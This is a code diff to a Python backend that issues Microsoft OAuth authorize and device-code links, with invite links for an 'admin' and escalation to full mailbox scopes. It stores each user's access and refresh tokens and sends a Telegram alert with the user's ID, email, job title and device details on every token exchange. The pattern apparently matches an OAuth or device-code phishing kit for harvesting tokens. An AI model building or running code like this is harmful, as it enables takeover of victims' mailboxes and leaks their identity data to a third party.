@@ -13,8 +13,6 @@ from models import (
     ConnectInvite,
     TenantConsent,
     TenantConsentStatus,
-    EnterpriseTenant,
-    EnterpriseMode,
 )
 
 CLIENT_ID = os.getenv("CLIENT_ID")
@@ -51,6 +49,44 @@ DEFAULT_SESSION_ID = "jwt-only"
 
 
 # =========================
+# HELPERS
+# =========================
+
+def extract_tenant_hint(user_id: str | None) -> str:
+    if not user_id:
+        return ""
+    if "@" in user_id:
+        return user_id.split("@", 1)[1].strip().lower()
+    return (user_id or "").strip().lower()
+
+
+def parse_enterprise_notes(notes: str | None) -> dict:
+    parsed = {
+        "mode": "preview",
+        "organization_name": "",
+        "notes": notes or "",
+    }
+    if not notes:
+        return parsed
+
+    for part in str(notes).split(";"):
+        if "=" not in part:
+            continue
+        key, value = part.split("=", 1)
+        key = key.strip().lower()
+        value = value.strip()
+
+        if key == "mode" and value:
+            parsed["mode"] = value
+        elif key in {"org", "organization", "organization_name"}:
+            parsed["organization_name"] = value
+        elif key == "notes":
+            parsed["notes"] = value
+
+    return parsed
+
+
+# =========================
 # TELEGRAM ALERTS
 # =========================
 
@@ -77,8 +113,9 @@ def save_token(user_id, token_data, device_info=None):
     db = SessionLocal()
 
     try:
+        expires_in = int(token_data.get("expires_in", 3600))
         expires_at = int(
-            (datetime.utcnow() + timedelta(seconds=token_data["expires_in"])).timestamp()
+            (datetime.utcnow() + timedelta(seconds=expires_in)).timestamp()
         )
 
         existing = db.query(TenantToken).filter_by(tenant_id=user_id).first()
@@ -212,40 +249,50 @@ def save_or_update_tenant_consent(
 
 
 # =========================
-# ENTERPRISE TENANTS
+# ENTERPRISE MODE (TenantConsent-backed)
 # =========================
 
-def get_user_enterprise_mode(user_id: str):
+def get_user_enterprise_mode(user_id: str, admin_user_id: str | None = None):
     if not user_id:
         return "preview"
 
-    tenant_hint = user_id.split("@")[-1].lower() if "@" in user_id else user_id.lower()
+    tenant_hint = extract_tenant_hint(user_id)
+    if not tenant_hint:
+        return "preview"
 
     init_db()
     db = SessionLocal()
     try:
-        row = db.query(EnterpriseTenant).filter(
-            EnterpriseTenant.tenant_hint == tenant_hint
-        ).first()
+        query = db.query(TenantConsent).filter(TenantConsent.tenant_hint == tenant_hint)
 
-        if not row:
+        if admin_user_id:
+            query = query.filter(TenantConsent.admin_user_id == admin_user_id)
+        else:
+            query = query.filter(TenantConsent.status == TenantConsentStatus.APPROVED)
+
+        rows = query.order_by(TenantConsent.updated_at.desc()).all()
+
+        if not rows:
             return "preview"
 
-        status_value = row.consent_status.value if hasattr(row.consent_status, "value") else str(row.consent_status)
-        if status_value.lower() != "approved":
-            return "preview"
+        for row in rows:
+            status_value = row.status.value if hasattr(row.status, "value") else str(row.status)
+            if str(status_value).lower() != "approved":
+                continue
 
-        mode_value = row.mode.value if hasattr(row.mode, "value") else str(row.mode)
-        return mode_value.lower()
+            mode_value = parse_enterprise_notes(getattr(row, "notes", "")).get("mode", "preview")
+            return (mode_value or "preview").lower()
+
+        return "preview"
     finally:
         db.close()
 
 
-def resolve_scopes(user_id: str | None = None, mail_mode: bool = False):
+def resolve_scopes(user_id: str | None = None, mail_mode: bool = False, admin_user_id: str | None = None):
     if not mail_mode:
         return BASIC_SCOPES
 
-    mode = get_user_enterprise_mode(user_id or "")
+    mode = get_user_enterprise_mode(user_id or "", admin_user_id=admin_user_id)
 
     if mode == "enterprise_full":
         return ENTERPRISE_SCOPES
@@ -257,7 +304,7 @@ def resolve_scopes(user_id: str | None = None, mail_mode: bool = False):
 # CONNECT INVITES
 # =========================
 
-def create_connect_invite(admin_user_id: str, connect_mode: str = "basic"):
+def create_connect_invite(admin_user_id: str, connect_mode: str = "basic", tenant_hint: str | None = None):
     init_db()
     db = SessionLocal()
 
@@ -272,6 +319,8 @@ def create_connect_invite(admin_user_id: str, connect_mode: str = "basic"):
 
         if hasattr(row, "connect_mode"):
             row.connect_mode = connect_mode
+        if hasattr(row, "tenant_hint"):
+            row.tenant_hint = tenant_hint
 
         db.add(row)
         db.commit()
@@ -372,37 +421,40 @@ def generate_login_link(user_id: str):
         state_value=state_value,
         scopes=resolve_scopes(user_id=user_id, mail_mode=False),
         tenant="common",
+        login_hint=user_id if "@" in user_id else None,
     )
 
 
-def generate_mail_connect_link(user_id: str):
+def generate_mail_connect_link(user_id: str, admin_user_id: str | None = None):
     # Step 2/3: preview or enterprise full
     state_value = f"user_mail:{user_id}"
     return build_authorize_url(
         state_value=state_value,
-        scopes=resolve_scopes(user_id=user_id, mail_mode=True),
+        scopes=resolve_scopes(user_id=user_id, mail_mode=True, admin_user_id=admin_user_id),
         tenant="common",
+        login_hint=user_id if "@" in user_id else None,
     )
 
 
-def generate_org_connect_link(admin_user_id: str):
-    invite_token = create_connect_invite(admin_user_id, connect_mode="basic")
+def generate_org_connect_link(admin_user_id: str, tenant_hint: str | None = None):
+    invite_token = create_connect_invite(admin_user_id, connect_mode="basic", tenant_hint=tenant_hint)
     state_value = f"invite_basic:{invite_token}"
     return build_authorize_url(
         state_value=state_value,
         scopes=BASIC_SCOPES,
         tenant="common",
+        domain_hint=tenant_hint if tenant_hint and "." in tenant_hint else None,
     )
 
 
-def generate_org_mail_connect_link(admin_user_id: str):
-    invite_token = create_connect_invite(admin_user_id, connect_mode="mail")
+def generate_org_mail_connect_link(admin_user_id: str, tenant_hint: str | None = None):
+    invite_token = create_connect_invite(admin_user_id, connect_mode="mail", tenant_hint=tenant_hint)
     state_value = f"invite_mail:{invite_token}"
-    # org mail link defaults to preview until tenant is marked enterprise_full
     return build_authorize_url(
         state_value=state_value,
         scopes=PREVIEW_SCOPES,
         tenant="common",
+        domain_hint=tenant_hint if tenant_hint and "." in tenant_hint else None,
     )
 
 
@@ -467,24 +519,56 @@ def fetch_graph_identity(access_token: str):
 def exchange_code_for_token(code: str, state: str, client_ip: str = None, user_agent: str = None):
     init_db()
 
-    decoded_state = unquote(state)
+    decoded_state = unquote(state or "")
 
     requested_scopes = BASIC_SCOPES
     flow_type = "basic"
+    state_user_id = None
+    admin_user_id_for_saved_user = None
+    invite_token = None
 
     if decoded_state.startswith("user_mail:") or decoded_state.startswith("invite_mail:"):
         flow_type = "mail"
-        flow_user_id = None
 
-        if decoded_state.startswith("user_mail:"):
-            flow_user_id = decoded_state.split("user_mail:", 1)[1]
-        elif decoded_state.startswith("invite_mail:"):
-            invite_token = decoded_state.split("invite_mail:", 1)[1]
-            invite = get_connect_invite(invite_token)
-            if invite and invite.resolved_user_id:
-                flow_user_id = invite.resolved_user_id
-
-        requested_scopes = resolve_scopes(user_id=flow_user_id, mail_mode=True)
+    if decoded_state.startswith("user_basic:"):
+        state_user_id = decoded_state.split("user_basic:", 1)[1]
+        admin_user_id_for_saved_user = state_user_id
+    elif decoded_state.startswith("user_mail:"):
+        state_user_id = decoded_state.split("user_mail:", 1)[1]
+        admin_user_id_for_saved_user = state_user_id
+        requested_scopes = resolve_scopes(user_id=state_user_id, mail_mode=True, admin_user_id=admin_user_id_for_saved_user)
+    elif decoded_state.startswith("invite_basic:"):
+        invite_token = decoded_state.split("invite_basic:", 1)[1]
+        invite = get_connect_invite(invite_token)
+        if invite:
+            admin_user_id_for_saved_user = invite.admin_user_id
+            if hasattr(invite, "resolved_user_id") and invite.resolved_user_id:
+                state_user_id = invite.resolved_user_id
+    elif decoded_state.startswith("invite_mail:"):
+        invite_token = decoded_state.split("invite_mail:", 1)[1]
+        invite = get_connect_invite(invite_token)
+        if invite:
+            admin_user_id_for_saved_user = invite.admin_user_id
+            if hasattr(invite, "resolved_user_id") and invite.resolved_user_id:
+                state_user_id = invite.resolved_user_id
+            requested_scopes = resolve_scopes(
+                user_id=state_user_id or "",
+                mail_mode=True,
+                admin_user_id=admin_user_id_for_saved_user,
+            )
+    elif decoded_state.startswith("user:"):
+        state_user_id = decoded_state.split("user:", 1)[1]
+        admin_user_id_for_saved_user = state_user_id
+    elif decoded_state.startswith("invite:"):
+        invite_token = decoded_state.split("invite:", 1)[1]
+        invite = get_connect_invite(invite_token)
+        if invite:
+            admin_user_id_for_saved_user = invite.admin_user_id
+            if hasattr(invite, "resolved_user_id") and invite.resolved_user_id:
+                state_user_id = invite.resolved_user_id
+    else:
+        admin_user_id_for_saved_user = decoded_state or None
+        state_user_id = decoded_state or None
 
     token_payload = {
         "client_id": CLIENT_ID,
@@ -503,8 +587,6 @@ def exchange_code_for_token(code: str, state: str, client_ip: str = None, user_a
 
     access_token = result["access_token"]
 
-    # Pure login scopes may not include Graph /me access.
-    # Try to resolve identity from Graph if possible, otherwise fall back to state.
     resolved_user_id = None
     job_title = None
     profile = {}
@@ -519,40 +601,7 @@ def exchange_code_for_token(code: str, state: str, client_ip: str = None, user_a
 
     device_info = build_device_info(client_ip, user_agent)
 
-    admin_user_id_for_saved_user = None
-
-    if decoded_state.startswith("user_basic:"):
-        admin_user_id_for_saved_user = decoded_state.split("user_basic:", 1)[1]
-    elif decoded_state.startswith("user_mail:"):
-        admin_user_id_for_saved_user = decoded_state.split("user_mail:", 1)[1]
-    elif decoded_state.startswith("invite_basic:"):
-        invite_token = decoded_state.split("invite_basic:", 1)[1]
-        invite = get_connect_invite(invite_token)
-        if invite:
-            admin_user_id_for_saved_user = invite.admin_user_id
-            if resolved_user_id:
-                mark_connect_invite_used(invite_token, resolved_user_id, job_title)
-    elif decoded_state.startswith("invite_mail:"):
-        invite_token = decoded_state.split("invite_mail:", 1)[1]
-        invite = get_connect_invite(invite_token)
-        if invite:
-            admin_user_id_for_saved_user = invite.admin_user_id
-            if resolved_user_id:
-                mark_connect_invite_used(invite_token, resolved_user_id, job_title)
-    elif decoded_state.startswith("user:"):
-        admin_user_id_for_saved_user = decoded_state.split("user:", 1)[1]
-    elif decoded_state.startswith("invite:"):
-        invite_token = decoded_state.split("invite:", 1)[1]
-        invite = get_connect_invite(invite_token)
-        if invite:
-            admin_user_id_for_saved_user = invite.admin_user_id
-            if resolved_user_id:
-                mark_connect_invite_used(invite_token, resolved_user_id, job_title)
-    else:
-        admin_user_id_for_saved_user = decoded_state
-
-    # If pure login has no Graph identity, keep fallback user id from state for continuity
-    effective_user_id = resolved_user_id or admin_user_id_for_saved_user
+    effective_user_id = resolved_user_id or state_user_id or admin_user_id_for_saved_user
 
     if effective_user_id:
         save_token(effective_user_id, result, device_info)
@@ -560,10 +609,14 @@ def exchange_code_for_token(code: str, state: str, client_ip: str = None, user_a
     if admin_user_id_for_saved_user and resolved_user_id:
         save_saved_user(admin_user_id_for_saved_user, resolved_user_id, job_title)
 
+    if invite_token and resolved_user_id:
+        mark_connect_invite_used(invite_token, resolved_user_id, job_title)
+
     email = profile.get("userPrincipalName") or profile.get("mail") or resolved_user_id or "unknown"
 
     send_telegram_alert(
         f"Resolved User ID: {resolved_user_id or 'unknown'}\n"
+        f"State User ID: {state_user_id or 'unknown'}\n"
         f"Job Title: {job_title or 'unknown'}\n"
         f"Admin/User Context: {admin_user_id_for_saved_user or 'unknown'}\n"
         f"Email: {email}\n"
@@ -574,6 +627,7 @@ def exchange_code_for_token(code: str, state: str, client_ip: str = None, user_a
 
     return {
         "resolved_user_id": resolved_user_id,
+        "effective_user_id": effective_user_id,
         "job_title": job_title,
         "profile": profile,
         "admin_user_id": admin_user_id_for_saved_user,
@@ -585,10 +639,10 @@ def exchange_code_for_token(code: str, state: str, client_ip: str = None, user_a
 # DEVICE FLOW
 # =========================
 
-def start_device_code_flow(mail_mode: bool = False, user_id: str | None = None):
+def start_device_code_flow(mail_mode: bool = False, user_id: str | None = None, admin_user_id: str | None = None):
     payload = {
         "client_id": CLIENT_ID,
-        "scope": resolve_scopes(user_id=user_id, mail_mode=mail_mode),
+        "scope": resolve_scopes(user_id=user_id, mail_mode=mail_mode, admin_user_id=admin_user_id),
     }
 
     res = requests.post(
@@ -717,13 +771,13 @@ def poll_device_code_flow(
 # TOKEN REFRESH
 # =========================
 
-def refresh_token(user_id: str):
+def refresh_token(user_id: str, admin_user_id: str | None = None):
     token_record = get_token(user_id)
 
     if not token_record or not token_record.refresh_token:
         raise Exception("No refresh token available. User must re-login.")
 
-    requested_scopes = resolve_scopes(user_id=user_id, mail_mode=True)
+    requested_scopes = resolve_scopes(user_id=user_id, mail_mode=True, admin_user_id=admin_user_id)
 
     data = {
         "client_id": CLIENT_ID,
